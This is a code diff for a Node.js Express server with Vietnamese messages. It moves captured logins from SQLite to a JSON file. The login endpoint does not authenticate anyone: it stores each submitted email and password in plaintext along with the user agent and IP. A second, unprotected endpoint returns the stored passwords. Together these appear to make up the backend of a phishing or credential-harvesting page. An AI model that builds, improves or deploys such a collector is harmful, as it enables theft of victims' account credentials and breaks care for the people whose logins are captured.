@@ -1,6 +1,5 @@
 const express = require("express");
 const path = require("path");
-const Database = require("better-sqlite3");
 const fs = require("fs");
 
 const PORT = process.env.PORT || 3001;
@@ -8,25 +7,38 @@ const app = express();
 app.set("trust proxy", 1);
 
 const dataDir = path.join(__dirname, "data");
+const DB_FILE = path.join(dataDir, "logins.json");
+
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
+if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "[]", "utf8");
 
-const db = new Database(path.join(dataDir, "logins.db"));
+function readLogins() {
+  try {
+    return JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
+  } catch {
+    return [];
+  }
+}
 
-db.exec(`
-  CREATE TABLE IF NOT EXISTS logins (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    email TEXT NOT NULL,
-    password TEXT NOT NULL,
-    user_agent TEXT,
-    ip TEXT,
-    created_at TEXT DEFAULT (datetime('now', 'localtime'))
-  )
-`);
+function writeLogins(rows) {
+  fs.writeFileSync(DB_FILE, JSON.stringify(rows, null, 2), "utf8");
+}
 
-const insertLogin = db.prepare(`
-  INSERT INTO logins (email, password, user_agent, ip)
-  VALUES (@email, @password, @user_agent, @ip)
-`);
+function addLogin(record) {
+  const rows = readLogins();
+  const id = rows.length ? Math.max(...rows.map((r) => r.id)) + 1 : 1;
+  const row = {
+    id,
+    email: record.email,
+    password: record.password,
+    user_agent: record.user_agent || "",
+    ip: record.ip || "",
+    created_at: new Date().toLocaleString("vi-VN", { hour12: false }),
+  };
+  rows.unshift(row);
+  writeLogins(rows);
+  return row;
+}
 
 app.use(express.json());
 app.use((req, res, next) => {
@@ -47,16 +59,16 @@ app.post("/api/login", (req, res) => {
   }
 
   try {
-    const info = insertLogin.run({
+    const row = addLogin({
       email,
       password,
       user_agent: req.get("user-agent") || "",
       ip: req.ip || req.socket?.remoteAddress || "",
     });
 
-    console.log(`[LƯU DB] id=${info.lastInsertRowid} | ${email} | ${new Date().toLocaleString("vi-VN")}`);
+    console.log(`[LƯU] id=${row.id} | ${email}`);
 
-    res.json({ ok: true, message: "Đã lưu vào database", id: info.lastInsertRowid });
+    res.json({ ok: true, message: "Đã lưu vào database", id: row.id });
   } catch (err) {
     console.error(err);
     res.status(500).json({ ok: false, message: "Lỗi server" });
@@ -64,14 +76,7 @@ app.post("/api/login", (req, res) => {
 });
 
 app.get("/api/logins", (_req, res) => {
-  const rows = db
-    .prepare(
-      `SELECT id, email, password, ip, created_at
-       FROM logins
-       ORDER BY id DESC
-       LIMIT 100`
-    )
-    .all();
+  const rows = readLogins().slice(0, 100);
   res.json({ ok: true, data: rows });
 });
 
